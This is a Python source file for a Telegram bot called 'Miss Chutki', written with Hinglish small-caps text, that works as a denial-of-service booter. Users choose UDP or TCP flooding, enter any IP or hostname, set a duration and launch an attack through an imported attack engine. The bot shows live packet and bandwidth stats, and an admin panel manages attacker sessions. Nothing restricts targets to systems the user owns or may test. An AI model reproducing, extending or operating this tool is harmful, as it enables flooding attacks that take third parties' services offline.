"""ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ — Bot Handler"""

from __future__ import annotations

import asyncio
import logging
import socket
import time
from typing import Dict, Optional, Set

from pyrogram import Client, filters
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

from attack_engine import AttackEngine, AttackStats
from config import Config
from utils import human_bytes, is_valid_ip, is_valid_port, resolve_hostname

LOGGER = logging.getLogger(__name__)

BRAND = "ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ"

# ─── Session ───────────────────────────────────────────────────────────────────

class UserSession:
    __slots__ = (
        "state", "ip", "port", "duration", "method",
        "engine", "attack_task", "last_msg_id", "chat_id",
    )
    def __init__(self) -> None:
        self.state       : str                    = "idle"
        self.ip          : str                    = ""
        self.port        : int                    = 80
        self.duration    : int                    = 60
        self.method      : str                    = "udp"
        self.engine      : Optional[AttackEngine] = None
        self.attack_task : Optional[asyncio.Task] = None
        self.last_msg_id : Optional[int]          = None
        self.chat_id     : Optional[int]          = None


SESSIONS   : Dict[int, UserSession] = {}
ADMIN_IDS  : Set[int]               = set()

def get_sess(uid: int) -> UserSession:
    if uid not in SESSIONS:
        SESSIONS[uid] = UserSession()
    return SESSIONS[uid]

def is_admin(uid: int, cfg: Config) -> bool:
    if cfg.admin_id and uid == cfg.admin_id:
        return True
    return uid in ADMIN_IDS


# ─── IP check ──────────────────────────────────────────────────────────────────

async def check_ip(ip: str, port: int) -> tuple[bool, str]:
    """Try to reach ip:port — returns (reachable, info_str)."""
    try:
        loop = asyncio.get_running_loop()
        start = time.perf_counter()
        sock  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        try:
            await asyncio.wait_for(
                loop.sock_connect(sock, (ip, port)), timeout=3.0
            )
            ms = (time.perf_counter() - start) * 1000
            sock.close()
            return True, f"🟢 ᴏɴʟɪɴᴇ · `{ms:.0f}ms`"
        except (OSError, asyncio.TimeoutError):
            sock.close()
            # UDP targets won't respond to TCP — still mark as reachable by DNS
            return True, "🟡 ᴘᴏʀᴛ ᴄʟᴏꜱᴇᴅ (ᴜᴅᴘ ᴛᴀʀɢᴇᴛ?)"
    except Exception as e:
        return False, f"🔴 ᴇʀʀᴏʀ: {e}"


# ─── Keyboards ─────────────────────────────────────────────────────────────────

def kb_main(is_adm: bool = False) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("⚡ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ",  callback_data="atk_start")],
        [
            InlineKeyboardButton("📊 ꜱᴛᴀᴛꜱ",    callback_data="cb_stats"),
            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",      callback_data="cb_stop"),
        ],
    ]
    if is_adm:
        rows.append([InlineKeyboardButton("🔐 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="admin_panel")])
    rows.append([InlineKeyboardButton("ℹ️ ʜᴇʟᴘ", callback_data="cb_help")])
    return InlineKeyboardMarkup(rows)

def kb_method() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔵 ᴜᴅᴘ", callback_data="m_udp"),
            InlineKeyboardButton("🔴 ᴛᴄᴘ", callback_data="m_tcp"),
        ],
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
    ])

def kb_back_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
    ])

def kb_back_method() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_method")],
    ])

def kb_confirm() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚀 ʟᴀᴜɴᴄʜ", callback_data="launch"),
            InlineKeyboardButton("❌ ᴄᴀɴᴄᴇʟ",  callback_data="back_main"),
        ],
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_dur")],
    ])

def kb_live() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 ʀᴇꜰʀᴇꜱʜ", callback_data="cb_stats"),
            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",     callback_data="cb_stop"),
        ],
    ])

def kb_admin() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("👥 ꜱᴇꜱꜱɪᴏɴꜱ",  callback_data="adm_sessions"),
            InlineKeyboardButton("🔄 ᴋɪʟʟ ᴀʟʟ",  callback_data="adm_killall"),
        ],
        [
            InlineKeyboardButton("➕ ᴀᴅᴅ ᴀᴅᴍɪɴ",  callback_data="adm_add"),
            InlineKeyboardButton("➖ ʀᴇᴍ ᴀᴅᴍɪɴ",  callback_data="adm_rem"),
        ],
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
    ])


# ─── Screens ───────────────────────────────────────────────────────────────────

def scr_home(is_adm: bool = False) -> str:
    adm_tag = "  🔐 **ᴀᴅᴍɪɴ**" if is_adm else ""
    return (
        f"╔═══════════════════════╗\n"
        f"║  ⚡  **{BRAND}**  ⚡  ║\n"
        f"╚═══════════════════════╝{adm_tag}\n\n"
        f"🎯 ᴛᴀʀɢᴇᴛ ɪᴘ ꜱᴜᴘᴘʟʏ ᴋᴀʀᴏ\n"
        f"⏱️ ᴛɪᴍᴇ ꜱᴇᴛ ᴋᴀʀᴏ\n"
        f"💥 ᴀᴛᴛᴀᴄᴋ ꜰɪʀᴇ ᴋᴀʀᴏ\n\n"
        f"👇 ᴏᴘᴛɪᴏɴ ꜱᴇʟᴇᴄᴛ ᴋᴀʀᴏ:"
    )

def scr_method() -> str:
    return (
        f"🎛️ **ᴍᴇᴛʜᴏᴅ ᴄʜᴏᴏꜱᴇ ᴋᴀʀᴏ**\n\n"
        f"🔵 **ᴜᴅᴘ** — ᴢʏᴀᴅᴀ ꜱᴘᴇᴇᴅ, ᴄᴏɴɴᴇᴄᴛɪᴏɴʟᴇꜱꜱ\n"
        f"🔴 **ᴛᴄᴘ** — ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴇxʜᴀᴜꜱᴛ"
    )

def scr_await_ip(method: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"🎯 **ᴛᴀʀɢᴇᴛ ɪᴘ ᴅᴀᴀʟᴏ** [{badge}]\n\n"
        f"ᴄʜᴀᴛ ᴍᴇɪɴ ɪᴘ ᴛʏᴘᴇ ᴋᴀʀᴏ:\n"
        f"`192.168.1.1`"
    )

def scr_checking(ip: str) -> str:
    return (
        f"🔍 **ᴛᴀʀɢᴇᴛ ᴄʜᴇᴄᴋ ʜᴏ ʀʜᴀ ʜᴀɪ...**\n\n"
        f"🎯 `{ip}`\n\n"
        f"⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ..."
    )

def scr_await_dur(ip: str, port: int, status: str, max_dur: int) -> str:
    return (
        f"⏱️ **ᴅᴜʀᴀᴛɪᴏɴ ᴅᴀᴀʟᴏ** (ꜱᴇᴄᴏɴᴅꜱ)\n\n"
        f"🎯 ᴛᴀʀɢᴇᴛ : `{ip}:{port}`\n"
        f"ꜱᴛᴀᴛᴜꜱ  : {status}\n\n"
        f"ᴍᴀx : `{max_dur}s`\n"
        f"ᴇx  : `60` · `120` · `300`\n\n"
        f"ᴄʜᴀᴛ ᴍᴇɪɴ ᴛɪᴍᴇ ᴛʏᴘᴇ ᴋᴀʀᴏ 👇"
    )

def scr_confirm(ip: str, port: int, dur: int, method: str, threads: int, status: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"🚀 **ᴀᴛᴛᴀᴄᴋ ᴄᴏɴꜰɪʀᴍ ᴋᴀʀᴏ**\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 🎯 ɪᴘ       : `{ip}`\n"
        f"│ 🔌 ᴘᴏʀᴛ    : `{port}`\n"
        f"│ ⏱️ ᴛɪᴍᴇ    : `{dur}s`\n"
        f"│ ⚡ ᴍᴇᴛʜᴏᴅ : {badge}\n"
        f"│ 🧵 ᴛʜʀᴇᴀᴅꜱ: `{threads}`\n"
        f"│ 📡 ꜱᴛᴀᴛᴜꜱ  : {status}\n"
        f"└──────────────────────────┘\n\n"
        f"🔥 **ʟᴀᴜɴᴄʜ** ᴅᴀʙᴀᴏ:"
    )

def scr_live(ip: str, port: int, dur: int, method: str, elapsed: float) -> str:
    pct       = min(1.0, elapsed / dur) if dur > 0 else 0
    filled    = int(pct * 20)
    bar       = "█" * filled + "░" * (20 - filled)
    remaining = max(0, dur - int(elapsed))
    badge     = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"💥 **ᴀᴛᴛᴀᴄᴋ ᴄʜᴀʟ ʀʜᴀ ʜᴀɪ!**\n\n"
        f"🎯 `{ip}:{port}`  {badge}\n\n"
        f"`[{bar}]`\n"
        f"⏱️ `{int(elapsed)}s` ʜᴏ ɢᴀʏᴀ  ·  `{remaining}s` ʙᴀᴀᴋɪ\n\n"
        f"📊 ʀᴇꜰʀᴇꜱʜ ᴅᴀʙᴀᴏ ꜱᴛᴀᴛꜱ ᴅᴇᴋʜɴᴇ ᴋᴇ ʟɪʏᴇ"
    )

def scr_stats(stats: AttackStats, ip: str, port: int, method: str) -> str:
    badge  = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    status = "🟢 ʀᴜɴɴɪɴɢ" if stats.running else "🔴 ꜱᴛᴏᴘᴘᴇᴅ"
    return (
        f"📊 **ʟɪᴠᴇ ꜱᴛᴀᴛꜱ**  {status}\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 🎯 `{ip}:{port}`  {badge}\n"
        f"│ 📦 ᴘᴀᴋᴇᴛ    : `{stats.sent_packets:,}`\n"
        f"│ ❌ ꜰᴀɪʟ      : `{stats.failed_packets:,}`\n"
        f"│ 📶 ᴅᴀᴛᴀ      : `{human_bytes(stats.bytes_sent)}`\n"
        f"│ ⚡ ᴘᴘꜱ       : `{stats.pps:,.0f}`\n"
        f"│ 🌊 ᴍʙᴘꜱ     : `{stats.mbps:.2f}`\n"
        f"│ ⏱️ ᴛɪᴍᴇ     : `{stats.elapsed:.1f}s`\n"
        f"└──────────────────────────┘"
    )

def scr_done(stats: AttackStats, ip: str, port: int, method: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"✅ **ᴀᴛᴛᴀᴄᴋ ᴋᴏᴍᴘʟᴇᴛ!**\n\n"
        f"🎯 `{ip}:{port}`  {badge}\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 📦 ᴛᴏᴛᴀʟ ᴘᴀᴋᴇᴛ : `{stats.sent_packets:,}`\n"
        f"│ 📶 ᴛᴏᴛᴀʟ ᴅᴀᴛᴀ  : `{human_bytes(stats.bytes_sent)}`\n"
        f"│ ⚡ ᴀᴠɢ ᴘᴘꜱ     : `{stats.pps:,.0f}`\n"
        f"│ 🌊 ᴀᴠɢ ᴍʙᴘꜱ   : `{stats.mbps:.2f}`\n"
        f"│ ⏱️ ᴛᴏᴛᴀʟ ᴛɪᴍᴇ : `{stats.elapsed:.1f}s`\n"
        f"└──────────────────────────┘\n\n"
        f"🏠 ᴅᴏʙᴀʀᴀ ᴀᴛᴛᴀᴄᴋ ᴋᴀʀɴᴀ ʜᴀɪ?"
    )

def scr_help() -> str:
    return (
        f"ℹ️ **{BRAND} — ʜᴇʟᴘ**\n\n"
        f"1️⃣ **ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ** ᴅᴀʙᴀᴏ\n"
        f"2️⃣ **ᴍᴇᴛʜᴏᴅ** ᴄʜᴜɴᴏ (ᴜᴅᴘ/ᴛᴄᴘ)\n"
        f"3️⃣ **ɪᴘ** ᴅᴀᴀʟᴏ — ᴀᴜᴛᴏ ᴄʜᴇᴄᴋ ʜᴏɢᴀ\n"
        f"4️⃣ **ᴅᴜʀᴀᴛɪᴏɴ** (ꜱᴇᴄᴏɴᴅꜱ)\n"
        f"5️⃣ **ʟᴀᴜɴᴄʜ** 🔥\n\n"
        f"📊 ʀᴇꜰʀᴇꜱʜ ꜱᴇ ʟɪᴠᴇ ꜱᴛᴀᴛꜱ ᴅᴇᴋʜᴏ\n"
        f"🛑 ꜱᴛᴏᴘ ꜱᴇ ᴀᴛᴛᴀᴄᴋ ʙᴀɴᴅ ᴋᴀʀᴏ"
    )

def scr_admin(total_sess: int, active: int) -> str:
    return (
        f"🔐 **ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ**\n\n"
        f"┌──────────────────────┐\n"
        f"│ 👥 ꜱᴇꜱꜱɪᴏɴꜱ : `{total_sess}`\n"
        f"│ ⚡ ᴀᴄᴛɪᴠᴇ   : `{active}`\n"
        f"│ 🔐 ᴀᴅᴍɪɴꜱ  : `{len(ADMIN_IDS) + 1}`\n"
        f"└──────────────────────┘"
    )

def scr_err(msg: str) -> str:
    return f"❌ **ᴇʀʀᴏʀ**\n\n`{msg}`"

def scr_idle() -> str:
    return f"📊 **ꜱᴛᴀᴛꜱ**\n\n🟡 ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪɴ\n**ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ** ᴅᴀʙᴀᴏ"


# ─── Helpers ───────────────────────────────────────────────────────────────────

async def _del(client: Client, chat_id: int, msg_id: int) -> None:
    try:
        await client.delete_messages(chat_id, msg_id)
    except Exception:
        pass

async def _send(
    client: Client, sess: UserSession,
    text: str, kb: InlineKeyboardMarkup,
) -> None:
    if sess.last_msg_id and sess.chat_id:
        await _del(client, sess.chat_id, sess.last_msg_id)
        sess.last_msg_id = None
    m = await client.send_message(sess.chat_id, text, reply_markup=kb)
    sess.last_msg_id = m.id

async def _edit(
    cb_msg: Message, sess: UserSession,
    text: str, kb: InlineKeyboardMarkup,
) -> None:
    try:
        await cb_msg.edit_text(text, reply_markup=kb)
        sess.last_msg_id = cb_msg.id
    except Exception:
        pass

async def _abort(
    client: Client, sess: UserSession,
    cb_msg: Optional[Message] = None,
) -> None:
    was = False
    if sess.engine:
        sess.engine.stop()
        was = True
    if sess.attack_task and not sess.attack_task.done():
        sess.attack_task.cancel()
        try:
            await sess.attack_task
        except asyncio.CancelledError:
            pass
    sess.state = "idle"
    label = "ꜱᴛᴏᴘ ʜᴏ ɢᴀʏᴀ ✅" if was else "ᴋᴏɪ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪɴ ᴛʜᴀ 🟡"
    text  = f"🛑 **ᴀᴛᴛᴀᴄᴋ {label}**"
    if cb_msg:
        try:
            await cb_msg.edit_text(text, reply_markup=kb_main())
            sess.last_msg_id = cb_msg.id
            return
        except Exception:
            pass
    await _send(client, sess, text, kb_main())


# ─── Register ──────────────────────────────────────────────────────────────────

def register(bot: Client, cfg: Config) -> None:

    # /start
    @bot.on_message(filters.command("start") & filters.private)
    async def cmd_start(client: Client, msg: Message) -> None:
        uid = msg.from_user.id
        s   = get_sess(uid)
        s.state   = "idle"
        s.chat_id = msg.chat.id
        await _del(client, msg.chat.id, msg.id)
        adm = is_admin(uid, cfg)
        await _send(client, s, scr_home(adm), kb_main(adm))

    # /stop
    @bot.on_message(filters.command("stop") & filters.private)
    async def cmd_stop(client: Client, msg: Message) -> None:
        s = get_sess(msg.from_user.id)
        s.chat_id = msg.chat.id
        await _del(client, msg.chat.id, msg.id)
        await _abort(client, s)

    # text input handler
    @bot.on_message(
        filters.text & filters.private
        & ~filters.command(["start","stop"])
    )
    async def on_text(client: Client, msg: Message) -> None:
        uid = msg.from_user.id
        s   = get_sess(uid)
        s.chat_id = msg.chat.id
        raw = msg.text.strip()
        await _del(client, msg.chat.id, msg.id)

        # ── IP input ──
        if s.state == "await_ip":
            ip = raw if is_valid_ip(raw) else resolve_hostname(raw)
            if not ip:
                await _send(client, s, scr_err(f"IP resolve nahi hua: {raw}"), kb_back_main())
                return
            s.ip    = ip
            s.state = "checking"

            # Show checking screen first
            if s.last_msg_id:
                await _del(client, s.chat_id, s.last_msg_id)
            chk_msg = await client.send_message(s.chat_id, scr_checking(ip), reply_markup=kb_back_main())
            s.last_msg_id = chk_msg.id

            # Actually check
            reachable, status = await check_ip(ip, 80)
            s.state = "await_dur"
            try:
                await chk_msg.edit_text(
                    scr_await_dur(ip, 80, status, cfg.max_duration),
                    reply_markup=kb_back_method()
                )
            except Exception:
                pass

        # ── Duration input ──
        elif s.state == "await_dur":
            if not raw.isdigit():
                await _send(client, s, scr_err("Sirf number daalo bhai"), kb_back_method())
                return
            s.duration = min(int(raw), cfg.max_duration)
            s.state    = "confirm"

            # Check port based on method
            port = 80
            s.port = port
            _, status = await check_ip(s.ip, port)

            await _send(client, s,
                scr_confirm(s.ip, s.port, s.duration, s.method, cfg.max_threads, status),
                kb_confirm())

        # ── Admin: add/rem ──
        elif s.state == "adm_add":
            if not raw.isdigit():
                await _send(client, s, scr_err("User ID number hona chahiye"), kb_admin())
                return
            ADMIN_IDS.add(int(raw))
            await _send(client, s, f"✅ `{raw}` admin ban gaya", kb_admin())
            s.state = "idle"

        elif s.state == "adm_rem":
            if not raw.isdigit():
                await _send(client, s, scr_err("User ID number hona chahiye"), kb_admin())
                return
            ADMIN_IDS.discard(int(raw))
            await _send(client, s, f"✅ `{raw}` admin se hata diya", kb_admin())
            s.state = "idle"

        else:
            adm = is_admin(uid, cfg)
            await _send(client, s, scr_home(adm), kb_main(adm))


    # callbacks
    @bot.on_callback_query()
    async def on_cb(client: Client, cb: CallbackQuery) -> None:
        uid  = cb.from_user.id
        s    = get_sess(uid)
        s.chat_id = cb.message.chat.id
        data = cb.data
        adm  = is_admin(uid, cfg)
        await cb.answer()

        # ── Main ──
        if data == "back_main":
            s.state = "idle"
            await _edit(cb.message, s, scr_home(adm), kb_main(adm))

        elif data == "atk_start":
            await _edit(cb.message, s, scr_method(), kb_method())

        # ── Method ──
        elif data == "m_udp":
            s.method = "udp"
            s.state  = "await_ip"
            await _edit(cb.message, s, scr_await_ip("udp"), kb_back_main())

        elif data == "m_tcp":
            s.method = "tcp"
            s.state  = "await_ip"
            await _edit(cb.message, s, scr_await_ip("tcp"), kb_back_main())

        elif data == "back_method":
            s.state = "idle"
            await _edit(cb.message, s, scr_method(), kb_method())

        elif data == "back_dur":
            s.state = "await_ip"
            await _edit(cb.message, s, scr_await_ip(s.method), kb_back_main())

        # ── Launch ──
        elif data == "launch":
            if s.state != "confirm":
                await _edit(cb.message, s, scr_home(adm), kb_main(adm))
                return
            s.state = "attacking"
            await _edit(cb.message, s,
                scr_live(s.ip, s.port, s.duration, s.method, 0),
                kb_live())
            _launch(client, cb.message, s, cfg)

        # ── Stats ──
        elif data == "cb_stats":
            if s.engine and s.engine.stats.running:
                await _edit(cb.message, s,
                    scr_stats(s.engine.stats, s.ip, s.port, s.method),
                    kb_live())
            else:
                await _edit(cb.message, s, scr_idle(), kb_main(adm))

        # ── Stop ──
        elif data == "cb_stop":
            await _abort(client, s, cb.message)

        # ── Help ──
        elif data == "cb_help":
            await _edit(cb.message, s, scr_help(), kb_back_main())

        # ── Admin panel ──
        elif data == "admin_panel":
            if not adm:
                await cb.answer("❌ Tu admin nahi hai", show_alert=True)
                return
            active = sum(1 for ss in SESSIONS.values() if ss.engine and ss.engine.stats.running)
            await _edit(cb.message, s, scr_admin(len(SESSIONS), active), kb_admin())

        elif data == "adm_sessions":
            if not adm:
                return
            lines = []
            for uid2, ss in SESSIONS.items():
                status = "⚡" if (ss.engine and ss.engine.stats.running) else "💤"
                lines.append(f"{status} `{uid2}`")
            text = "👥 **ꜱᴇꜱꜱɪᴏɴꜱ:**\n\n" + ("\n".join(lines) if lines else "Koi nahi")
            await _edit(cb.message, s, text, kb_admin())

        elif data == "adm_killall":
            if not adm:
                return
            killed = 0
            for ss in SESSIONS.values():
                if ss.engine:
                    ss.engine.stop()
                    killed += 1
                if ss.attack_task and not ss.attack_task.done():
                    ss.attack_task.cancel()
                ss.state = "idle"
            await _edit(cb.message, s, f"🛑 **{killed} ᴀᴛᴛᴀᴄᴋꜱ ᴋɪʟʟ ʜᴏ ɢᴀʏᴇ**", kb_admin())

        elif data == "adm_add":
            if not adm:
                return
            s.state = "adm_add"
            await _edit(cb.message, s, "➕ **Naya admin ka user ID bhejo:**", kb_admin())

        elif data == "adm_rem":
            if not adm:
                return
            s.state = "adm_rem"
            await _edit(cb.message, s, "➖ **Hatane wale admin ka user ID bhejo:**", kb_admin())


    def _launch(client: Client, cb_msg: Message, s: UserSession, cfg: Config) -> None:
        engine  = AttackEngine(cfg.max_threads, cfg.max_duration)
        s.engine = engine

        async def _run() -> None:
            try:
                if s.method == "udp":
                    stats = await engine.run_udp(s.ip, s.port, s.duration)
                else:
                    stats = await engine.run_tcp(s.ip, s.port, s.duration)
                s.state = "idle"
                try:
                    await cb_msg.edit_text(
                        scr_done(stats, s.ip, s.port, s.method),
                        reply_markup=kb_main(is_admin(cb_msg.chat.id, cfg)),
                    )
                except Exception:
                    pass
            except asyncio.CancelledError:
                pass
            except Exception as exc:
                LOGGER.exception("Attack error")
                try:
                    await cb_msg.edit_text(scr_err(str(exc)), reply_markup=kb_main())
                except Exception:
                    pass

        s.attack_task = asyncio.create_task(_run())
